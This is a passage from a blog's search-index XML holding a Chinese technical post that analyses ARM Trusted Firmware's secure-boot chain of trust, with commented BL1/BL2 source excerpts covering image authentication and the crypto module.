<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>arm-trusted-firmware可信启动机制</title>
      <link href="/2022/04/20/ATF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E8%B0%83%E7%A0%94%E6%8A%A5%E5%91%8A/"/>
      <url>/2022/04/20/ATF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E8%B0%83%E7%A0%94%E6%8A%A5%E5%91%8A/</url>
      
        <content type="html"><![CDATA[<p>ATF 可信启动调研</p><span id="more"></span><h1 id="arm安全技术atf的可信启动"><a class="markdownIt-Anchor" href="#arm安全技术atf的可信启动">#</a> ARM 安全技术（ATF 的可信启动）</h1><h1 id="一-目标"><a class="markdownIt-Anchor" href="#一-目标">#</a> 一、目标</h1><p>本文主要针对 ATF 的可信启动进行分析，可信机制主要位于代码的 BL2 文件夹中，目录结构如下：</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202204192350730.png" alt="image-20220419235053590"></p><p>为便于后续分析给出 ATF 加载流程，给出官网中一个直观的流程图：</p><p><img src="https://img-blog.csdn.net/20170806212819380?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvQWxleF9fX1poYW8=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt="img"></p><p>另外 ATF 固件源码整体架构如下：</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202204191908530.png" alt="在这里插入图片描述"></p><h1 id="二-核心服务原理分析"><a class="markdownIt-Anchor" href="#二-核心服务原理分析">#</a> 二、核心服务原理分析</h1><h2 id="一安全启动与信任链"><a class="markdownIt-Anchor" href="#一安全启动与信任链">#</a> （一）安全启动与信任链</h2><p>安全启动是建立系统信任链（Chain of Trust）的基础。信任链（Chain of Trust）是基于根信任（Root of trust）创建的， 而根信任的实现是基于两种技术：不可修改的 bootloader 和不可被修改的公钥。公钥通常存放在 OTP（One-Time-Programmable）内存中， bootloader 同常存储在 ROM 中或者不可修改的 Flash 内存中。</p><h2 id="二安全启动流程图"><a class="markdownIt-Anchor" href="#二安全启动流程图">#</a> （二）安全启动流程图</h2><blockquote><p>为了便于后续对代码的理解分析，这里先给出安全启动流程图</p></blockquote><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202204192304669.png" alt="image-20220419230432541"></p><h3 id="说明"><a class="markdownIt-Anchor" href="#说明">#</a> 说明：</h3><h4 id="arch初始化"><a class="markdownIt-Anchor" href="#arch初始化">#</a> arch 初始化</h4><p>对于 AArch64：</p><ol><li>BL2 执行 normal world 和后续阶段所需的最小架构初始化。</li><li>通过清零 CPACR.FPEN 位，使 EL1 和 EL0 可以访问 SIMD 寄存器。</li></ol><h4 id="platform初始化"><a class="markdownIt-Anchor" href="#platform初始化">#</a> Platform 初始化</h4><p>BL2 主要执行如下初始化步骤：</p><p>1、初始化 console (PL101).（尽管在 bl1 时已经初始化过一次）<br>2、初始化和配置储存设备驱动，用于加载后续的 bl。<br>3、使能 MMU ，map the memory，访问权限.<br>4、平台安全设置，相关组件（寄存器，外设，地址等）的访问控制<br> 5、为 BL3 阶段的 image 保留内存空间。<br>6、为 BL3 阶段的 image 定义可用内存地址范围。<br>7、如果 BL1 使用 TB_FW_CONFIG dynamic configuration file (保存在 arg0) , 解析配置参数</p><h4 id="image-load"><a class="markdownIt-Anchor" href="#image-load">#</a> image load</h4><p>BL2 通过查找 image list 的方式加载 image，并且将这个 list 传递给下一个 BL 镜像。</p><p>平台实现方法提供的可加载 image list 还可以包含动态配置文件。这个配置文件可以根据需要在 bl2_plat_handle_post_image_load（）函数中进行解析。 通过更新此函数中的相应 ep 信息，可以将这些配置文件作为参数传递给下一个 Boot Loader 阶段。</p><h4 id="scp_bl2-image-load"><a class="markdownIt-Anchor" href="#scp_bl2-image-load">#</a> SCP_BL2 image load</h4><p>BL2 将可选的 SCP_BL2 镜像从平台存储设备加载到特定的安全内存区域。 SCP_BL2 的后续处理是特定于具体平台的，需要自行实现。 例如，Arm Juno ，BL2 先把 SCP_BL2 加载到 trust sram，再使用 Boot Over MHU (BOM) 协议，把 SCP_BL2 加载到 SCP 的内部 RAM 之后，SCP 运行 SCP_BL2，并给 AP 发出 signals，通知 BL2 继续执行。</p><h4 id="load-el3-software"><a class="markdownIt-Anchor" href="#load-el3-software">#</a> Load EL3 software</h4><p>BL2 从平台存储设备加载 EL3 runtime software 到 trusted SRAM. 如果内存空间不够或者镜像不存在去，则 assert 停止运行。</p><h4 id="aarch64secure-el1-payload-image-load"><a class="markdownIt-Anchor" href="#aarch64secure-el1-payload-image-load">#</a> AArch64(Secure-EL1 payload) image load</h4><p>BL2 将可选的 BL32 镜像从平台存储设备加载到特定于平台的安全存储区域。BL32 镜像在安全世界中执行。BL2 依靠 BL31 将控制权限传递给 BL32（如果存在）。 因此，BL2 也会使用 BL32 镜像的 entrypoint。 用于进入 BL32 的 Saved Processor Status Register（SPSR）的值不是由 BL2 确定的，它由 BL31 内的 Secure-EL1 Payload Dispatcher (SPD) 初始化，SPD 负责管理与 BL32 的交互。此信息将传递给 BL31。</p><h4 id="bl33non-trusted-fireware-image-load"><a class="markdownIt-Anchor" href="#bl33non-trusted-fireware-image-load">#</a> BL33(Non-trusted Fireware) image load</h4><p>BL2 将 BL33 镜像（e.g. UEFI or other test or boot software）从平台存储设备加载到由平台定义的非安全内存中。</p><p>一旦安全状态初始化完成，BL2 依靠 EL3 Runtime Software 将控制权传递给 BL33。 因此，BL2 使用正常世界的镜像入口和保存程序状态寄存器（SPSR）填充平台指定的存储区域。entrypoint 是 BL33 镜像的加载地址。 SPSR 按照 PSCI PDD 中的规定确定（PSCI 5.13 节）。 此信息将传递给 EL3runtime software。</p><h4 id="aarch64-bl31el3-runtime-software-execution"><a class="markdownIt-Anchor" href="#aarch64-bl31el3-runtime-software-execution">#</a> AArch64 BL31(EL3 Runtime Software) execution</h4><p>BL2 执行继续如下：</p><p>BL2 通过产生 SMC 异常将控制权传递回 BL1，并给 BL1 提供 BL31 入口点。 SMC 异常由 BL1 阶段 install 的 SMC exception handler 来处理。<br>BL1 关闭 MMU 并刷 Cache。清 SCTLR_EL3.M/ I / C 位，将 D-cache 刷新到 point of coherency 并使 TLB 无效。<br>BL1 在 EL3 的指定入口地址将控制权传递给 BL31。</p><h1 id="三-源代码分析"><a class="markdownIt-Anchor" href="#三-源代码分析">#</a> 三、源代码分析</h1><h2 id="一bl1trusted-boot-rom分析"><a class="markdownIt-Anchor" href="#一bl1trusted-boot-rom分析">#</a> （一）BL1（<strong>Trusted Boot ROM</strong>）分析</h2><p>BL1 启动最早的 ROM，是在 CPU 的 ROM 里不是和 BIOS 一起，是一起的信任根。BL1 主要目的是建立 Trusted SRAM、exception vector、初始化串口 console 等等。然后找到并验证 BL2（验签 CSF 头），然后跳过去。</p><p>入口点:bl1_entrypoint.S:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">func bl1_entrypoint</span><br><span class="line">        ....</span><br><span class="line">blbl1_early_platform_setup</span><br><span class="line">blbl1_plat_arch_setup</span><br><span class="line">        ....</span><br><span class="line">blbl1_main</span><br><span class="line">        ....</span><br><span class="line">bel3_exit</span><br><span class="line">endfunc bl1_entrypoint</span><br></pre></td></tr></table></figure><h2 id="二bl2trusted-boot-firmware分析"><a class="markdownIt-Anchor" href="#二bl2trusted-boot-firmware分析">#</a> （二）BL2（<strong>Trusted Boot Firmware</strong>）分析</h2><h3 id="1-功能概要"><a class="markdownIt-Anchor" href="#1-功能概要">#</a> 1、功能概要</h3><p>BL2 主要负责对其他所有 BL 进行认证和加载，并执行 BL31, 该函数主要实现将 BL3x 的 image 加载 RAM 中，并通过 smc 调用执行 BL1 中指定的 smc handle 将 CPU 的全向交给 BL31。</p><h3 id="2-主过程"><a class="markdownIt-Anchor" href="#2-主过程">#</a> 2、主过程</h3><blockquote><p>各部分代码分析已在注释中给出</p></blockquote><h4 id="bl2_entrypoints"><a class="markdownIt-Anchor" href="#bl2_entrypoints">#</a> BL2_entrypoint.S</h4><ul><li>BL2 入口位于 <code>bl2/aarch64/bl2_entrypoint.S</code>  中，BL2_entrypoint 是 BL2 的入口，前半部分主要进行一系列初始化工作，然后通过 BL2_main () 加载 BL3x 镜像到 RAM 中，最后通过 SMC 调用执行 BL1 中指定的 smc handler 将 CPU 执行权交给 BL31。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">.globlbl2_entrypoint</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">func bl2_entrypoint</span><br><span class="line">movx20, x1 /* x1保存了内存布局信息 */</span><br><span class="line"></span><br><span class="line">    /* 设置异常处理函数 */</span><br><span class="line">adrx0, early_exceptions</span><br><span class="line">msrvbar_el1, x0</span><br><span class="line">isb</span><br><span class="line"></span><br><span class="line">/* ---------------------------------------------</span><br><span class="line"> * 使能异常</span><br><span class="line"> * ---------------------------------------------</span><br><span class="line"> */</span><br><span class="line">msrdaifclr, #DAIF_ABT_BIT</span><br><span class="line"></span><br><span class="line">/* ---------------------------------------------</span><br><span class="line"> * 使能指令缓存，使能堆栈数据访问对齐检查</span><br><span class="line"> * ---------------------------------------------</span><br><span class="line"> */</span><br><span class="line">movx1, #(SCTLR_I_BIT | SCTLR_A_BIT | SCTLR_SA_BIT)</span><br><span class="line">mrsx0, sctlr_el1</span><br><span class="line">orrx0, x0, x1</span><br><span class="line">msrsctlr_el1, x0</span><br><span class="line">isb</span><br><span class="line"></span><br><span class="line">/* ---------------------------------------------</span><br><span class="line"> * 失效内存</span><br><span class="line"> * ---------------------------------------------</span><br><span class="line"> */</span><br><span class="line">adrx0, __RW_START__</span><br><span class="line">adrx1, __RW_END__</span><br><span class="line">subx1, x1, x0</span><br><span class="line">blinv_dcache_range</span><br><span class="line"></span><br><span class="line">/* ---------------------------------------------</span><br><span class="line"> * BSS内存初始化</span><br><span class="line"> * ---------------------------------------------</span><br><span class="line"> */</span><br><span class="line">ldrx0, =__BSS_START__</span><br><span class="line">ldrx1, =__BSS_SIZE__</span><br><span class="line">blzeromem16</span><br><span class="line"></span><br><span class="line">#if USE_COHERENT_MEM</span><br><span class="line">ldrx0, =__COHERENT_RAM_START__</span><br><span class="line">ldrx1, =__COHERENT_RAM_UNALIGNED_SIZE__</span><br><span class="line">blzeromem16</span><br><span class="line">#endif</span><br><span class="line"></span><br><span class="line">/* --------------------------------------------</span><br><span class="line"> * 设置SP指针</span><br><span class="line"> * --------------------------------------------</span><br><span class="line"> */</span><br><span class="line">blplat_set_my_stack</span><br><span class="line"></span><br><span class="line">/* ---------------------------------------------</span><br><span class="line"> * 串口初始化，更新内存布局信息，并初始化页表使能mmu</span><br><span class="line"> * ---------------------------------------------</span><br><span class="line"> */</span><br><span class="line">movx0, x20</span><br><span class="line">blbl2_early_platform_setup</span><br><span class="line">blbl2_plat_arch_setup</span><br><span class="line"></span><br><span class="line">/* ---------------------------------------------</span><br><span class="line"> * 跳转到主函数（通过SMC执行下一级BL不会返回）</span><br><span class="line"> * ---------------------------------------------</span><br><span class="line"> */</span><br><span class="line">blbl2_main</span><br><span class="line"></span><br><span class="line">/* ---------------------------------------------</span><br><span class="line"> * 下面的代码不会执行</span><br><span class="line"> * ---------------------------------------------</span><br><span class="line"> */</span><br><span class="line">no_retplat_panic_handler</span><br><span class="line"></span><br><span class="line">endfunc bl2_entrypoint</span><br></pre></td></tr></table></figure><h4 id="bl2_main"><a class="markdownIt-Anchor" href="#bl2_main">#</a> BL2_main</h4><p>bl2_main 为 bl2 的主程序，位于 bl2/bl2_main.c 中，安全启动的最重要两步在这个函数中完成：初始化硬件和找到 BL31。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">void bl2_main(void)</span><br><span class="line">&#123;</span><br><span class="line">entry_point_info_t *next_bl_ep_info;</span><br><span class="line">/* 输出提示信息 */</span><br><span class="line">NOTICE(&quot;BL2: %s\n&quot;, version_string); </span><br><span class="line">NOTICE(&quot;BL2: %s\n&quot;, build_message);</span><br><span class="line"></span><br><span class="line">/* Perform remaining generic architectural setup in S-EL1 */</span><br><span class="line"></span><br><span class="line">/* 初始化，这里开启FP/SIMD的访问权限 */</span><br><span class="line">bl2_arch_setup();</span><br><span class="line"></span><br><span class="line">#if PSA_FWU_SUPPORT</span><br><span class="line">fwu_init();</span><br><span class="line">#endif /* PSA_FWU_SUPPORT */</span><br><span class="line"></span><br><span class="line">crypto_mod_init();//初始化加密库，加密库可以用于校验签名和哈希</span><br><span class="line"></span><br><span class="line">/* Initialize authentication module */</span><br><span class="line">auth_mod_init(); //初始化认证模块</span><br><span class="line"></span><br><span class="line">/* Initialize the Measured Boot backend */</span><br><span class="line">bl2_plat_mboot_init();//初始化 measured boot后端</span><br><span class="line"></span><br><span class="line">/* Initialize boot source */</span><br><span class="line">bl2_plat_preload_setup();  //初始化镜像解析模块（img_parser_mod），用于校验镜像完整性以及从镜像中提取内容</span><br><span class="line"></span><br><span class="line">/*加载后续引导加载程序映像。*/</span><br><span class="line">next_bl_ep_info = bl2_load_images();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/*拆除 Measured Boot 后端*/</span><br><span class="line">bl2_plat_mboot_finish();</span><br><span class="line"></span><br><span class="line">#if !BL2_AT_EL3 &amp;&amp; !ENABLE_RME</span><br><span class="line">#ifndef __aarch64__</span><br><span class="line">/*</span><br><span class="line"> * 对于 AArch32 状态，BL1 和 BL2 共享 MMU 设置。</span><br><span class="line"> * 鉴于 BL2 不映射 BL1 区域，MMU 需要</span><br><span class="line"> * 被禁用以返回 BL1。</span><br><span class="line"> */</span><br><span class="line">disable_mmu_icache_secure();</span><br><span class="line">#endif /* !__aarch64__ */</span><br><span class="line"></span><br><span class="line">console_flush(); //控制台刷新</span><br><span class="line"></span><br><span class="line">#if ENABLE_PAUTH</span><br><span class="line">/*</span><br><span class="line"> * 在运行下一个引导映像之前禁用指针身份验证</span><br><span class="line"> */</span><br><span class="line">pauth_disable_el1();</span><br><span class="line">#endif /* ENABLE_PAUTH */</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/* 调用smc指令，触发在bl1中设定的smc异常中断处理函数，跳转到bl31 */</span><br><span class="line">smc(BL1_SMC_RUN_IMAGE, (unsigned long)next_bl_ep_info, 0, 0, 0, 0, 0, 0);</span><br><span class="line">#else /* if BL2_AT_EL3 || ENABLE_RME */</span><br><span class="line">NOTICE(&quot;BL2: Booting &quot; NEXT_IMAGE &quot;\n&quot;);</span><br><span class="line">print_entry_point_info(next_bl_ep_info);</span><br><span class="line">console_flush();</span><br><span class="line"></span><br><span class="line">#if ENABLE_PAUTH</span><br><span class="line">/*</span><br><span class="line"> * 在运行下一个引导映像之前禁用指针身份验证</span><br><span class="line"> */</span><br><span class="line">pauth_disable_el3();</span><br><span class="line">#endif /* ENABLE_PAUTH */</span><br><span class="line"></span><br><span class="line">bl2_run_next_image(next_bl_ep_info);</span><br><span class="line">#endif /* BL2_AT_EL3 &amp;&amp; ENABLE_RME */</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面依次对 bl2_main 中的安全模块进行分析：</p><h5 id="crypto_mod_init"><a class="markdownIt-Anchor" href="#crypto_mod_init">#</a> crypto_mod_init()</h5><p>主要初始化加密库，加密库可以用于校验签名和哈希，跟进 <code>crypto_mod_init()</code></p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202204192238842.png" alt="image-20220419223805632"></p><p>在 crypto_mod.h 中定义了 <code>crypto_lib_desc_s</code>  结构体</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202204192239362.png" alt="image-20220419223942221"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">crypto_lib_desc_s</span> &#123;</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> *name;<span class="comment">/* 名称， */</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> (*init)(<span class="type">void</span>);<span class="comment">/* 初始化方法 */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 校验签名的方法 */</span></span><br><span class="line"><span class="type">int</span> (*verify_signature)(</span><br><span class="line">                <span class="type">void</span> *data_ptr, <span class="type">unsigned</span> <span class="type">int</span> data_len,   <span class="comment">/* 要签名的数据 */</span></span><br><span class="line"><span class="type">void</span> *sig_ptr, <span class="type">unsigned</span> <span class="type">int</span> sig_len,     <span class="comment">/* 签名 */</span></span><br><span class="line"><span class="type">void</span> *sig_alg, <span class="type">unsigned</span> <span class="type">int</span> sig_alg_len, <span class="comment">/* 签名算法 */</span></span><br><span class="line"><span class="type">void</span> *pk_ptr, <span class="type">unsigned</span> <span class="type">int</span> pk_len);      <span class="comment">/* 公钥 */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 校验哈希的方法 */</span></span><br><span class="line"><span class="type">int</span> (*verify_hash)(</span><br><span class="line">               <span class="type">void</span> *data_ptr, <span class="type">unsigned</span> <span class="type">int</span> data_len,       <span class="comment">/* 要计算哈希的数据 */</span></span><br><span class="line">   <span class="type">void</span> *digest_info_ptr, <span class="type">unsigned</span> <span class="type">int</span> digest_info_len);<span class="comment">/* 哈希值 */</span></span><br><span class="line">&#125; <span class="type">crypto_lib_desc_t</span>;</span><br></pre></td></tr></table></figure><p>通过 <code>REGISTER_CRYPTO_LIB</code>  宏实现一个名为 <code>crypto_lib_desc</code>  类型为 <code>crypto_lib_desc_t</code>  结构体。宏实现如下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#define REGISTER_CRYPTO_LIB(_name, _init, _verify_signature, _verify_hash) \</span><br><span class="line">const crypto_lib_desc_t crypto_lib_desc = &#123; \</span><br><span class="line">.name = _name, \</span><br><span class="line">.init = _init, \</span><br><span class="line">.verify_signature = _verify_signature, \</span><br><span class="line">.verify_hash = _verify_hash \</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此模块通过操作 crypto_lib_desc 变量，实现模块初始化、校验签名、校验哈希。函数声明如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">/* 模块初始化 */</span><br><span class="line">void crypto_mod_init(void);</span><br><span class="line"></span><br><span class="line">/* 校验签名 */</span><br><span class="line">int crypto_mod_verify_signature(void *data_ptr, unsigned int data_len,</span><br><span class="line">void *sig_ptr, unsigned int sig_len,</span><br><span class="line">void *sig_alg, unsigned int sig_alg_len,</span><br><span class="line">void *pk_ptr, unsigned int pk_len);</span><br><span class="line">/* 校验哈希值 */</span><br><span class="line">int crypto_mod_verify_hash(void *data_ptr, unsigned int data_len,</span><br><span class="line">   void *digest_info_ptr, unsigned int digest_info_len);</span><br></pre></td></tr></table></figure><h5 id="auth_mod_init"><a class="markdownIt-Anchor" href="#auth_mod_init">#</a> auth_mod_init()</h5><p>auth_mod 实现了一个校验镜像的模型，此模型通过结构体 <code>auth_img_desc_t</code>  描述，跟进 auth_mod_init,</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202204192243044.png" alt="image-20220419224356942"></p><p>在 auth.mod.h 中定义了 auth_img_desc_s 结构体</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">typedef struct auth_img_desc_s &#123;</span><br><span class="line">/* 镜像的ID,标志是哪一个镜像 */</span><br><span class="line">unsigned int img_id;</span><br><span class="line"></span><br><span class="line">/* 镜像类型(Binary、证书等) */</span><br><span class="line">img_type_t img_type;</span><br><span class="line"></span><br><span class="line">/* 父镜像，保存了认证当前镜像的公钥、哈希等 */</span><br><span class="line">const struct auth_img_desc_s *parent;</span><br><span class="line"></span><br><span class="line">/* 认证当前镜像的方法 */</span><br><span class="line">auth_method_desc_t img_auth_methods[AUTH_METHOD_NUM];</span><br><span class="line"></span><br><span class="line">/* 用于校验子镜像的公钥、哈希等 */</span><br><span class="line">auth_param_desc_t authenticated_data[COT_MAX_VERIFIED_PARAMS];</span><br><span class="line">&#125; auth_img_desc_t;</span><br></pre></td></tr></table></figure><p>并定义一个宏 <code>REGISTER_COT</code> ，用于注册 <code>auth_img_desc_t</code>  数组</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#define REGISTER_COT(_cot) \</span><br><span class="line">const auth_img_desc_t *const cot_desc_ptr = \</span><br><span class="line">(const auth_img_desc_t *const)&amp;_cot[0]; \</span><br><span class="line">unsigned int auth_img_flags[sizeof(_cot)/sizeof(_cot[0])]</span><br></pre></td></tr></table></figure><p><code>auth_mod_verify_img</code>  通过 <code>img_id</code>  访问 <code>cot_desc_ptr</code>  数组，找到对应的镜像描述符 <code>auth_method_desc_t</code> ，即可知道当前镜像的认证方式，访问父节点找到签名的公钥或哈希，即可认证当前镜像是否合法。在认证完当前镜像后，从镜像中解析出公钥哈希等放入当前的镜像描述符中，便于对下一级镜像校验</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">int auth_mod_verify_img(unsigned int img_id,</span><br><span class="line">void *img_ptr,</span><br><span class="line">unsigned int img_len)</span><br><span class="line">&#123;</span><br><span class="line">const auth_img_desc_t *img_desc = NULL;</span><br><span class="line">const auth_method_desc_t *auth_method = NULL;</span><br><span class="line">void *param_ptr;</span><br><span class="line">unsigned int param_len;</span><br><span class="line">int rc, i;</span><br><span class="line"></span><br><span class="line">/* 根据img_id获取镜像描述符 */</span><br><span class="line">img_desc = &amp;cot_desc_ptr[img_id];</span><br><span class="line"></span><br><span class="line">/* 校验镜像完整性 */</span><br><span class="line">rc = img_parser_check_integrity(img_desc-&gt;img_type, img_ptr, img_len);</span><br><span class="line">return_if_error(rc);</span><br><span class="line"></span><br><span class="line">/* 根据镜像描述符的仍正方式对镜像进行认证 */</span><br><span class="line">for (i = 0 ; i &lt; AUTH_METHOD_NUM ; i++) &#123;</span><br><span class="line">auth_method = &amp;img_desc-&gt;img_auth_methods[i];</span><br><span class="line">switch (auth_method-&gt;type) &#123;</span><br><span class="line">case AUTH_METHOD_NONE:/* 不需要认证 */</span><br><span class="line">rc = 0;</span><br><span class="line">break;</span><br><span class="line">case AUTH_METHOD_HASH:/* 哈希认证 */</span><br><span class="line">rc = auth_hash(&amp;auth_method-&gt;param.hash,</span><br><span class="line">img_desc, img_ptr, img_len);</span><br><span class="line">break;</span><br><span class="line">case AUTH_METHOD_SIG:/* 签名认证 */</span><br><span class="line">rc = auth_signature(&amp;auth_method-&gt;param.sig,</span><br><span class="line">img_desc, img_ptr, img_len);</span><br><span class="line">break;</span><br><span class="line">case AUTH_METHOD_NV_CTR:/* Non-Volatile counter认证？ */</span><br><span class="line">rc = auth_nvctr(&amp;auth_method-&gt;param.nv_ctr,</span><br><span class="line">img_desc, img_ptr, img_len);</span><br><span class="line">break;</span><br><span class="line">default:</span><br><span class="line">/* 未知认证类型，报错 */</span><br><span class="line">rc = 1;</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">return_if_error(rc);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/* 从镜像中解析出公钥哈希等，以便对下一级镜像进行认证 */</span><br><span class="line">for (i = 0 ; i &lt; COT_MAX_VERIFIED_PARAMS ; i++) &#123;</span><br><span 